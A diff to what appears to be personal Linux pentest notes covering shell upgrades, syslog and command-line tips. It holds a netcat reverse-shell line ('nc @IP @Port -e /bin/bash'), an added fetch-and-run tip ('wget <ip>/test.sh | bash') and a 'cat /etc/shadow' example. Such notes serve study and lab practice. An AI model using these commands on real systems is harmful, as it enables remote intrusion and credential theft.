@@ -141,9 +141,9 @@ python3 -c "import pty; pty.spawn('/bin/bash')" (check what version of python is
 python -c "import pty; pty.spawn('/bin/bash')"
 python -c `import pty;pty.spawn("/bin/sh")'
 nc @IP @Port -e /bin/bash
-	
- [[Privilege escalation#^ebeddb]]
-		
+
+[[Privilege escalation#^ebeddb]]
+
 ## Logs 
 Linux uses Syslog itself is the protocol used to transport messages from network devices to a server that logs them. The log files on a syslog server are the main source of information about the operation and performance of network devices and other resources and are frequently used to identify and debug issues.
 
@@ -157,6 +157,7 @@ fx python -m SimpleHTTPServer 8000 &
 ### tip and tricks 
 
 | allows you append command to another one cat /etc/shadow | grep root
+you can also it too download and execute in one line. wget <ip>/test.sh | bash
 
 & allow you to continue to  use terminal e.g python -m http.server &
 
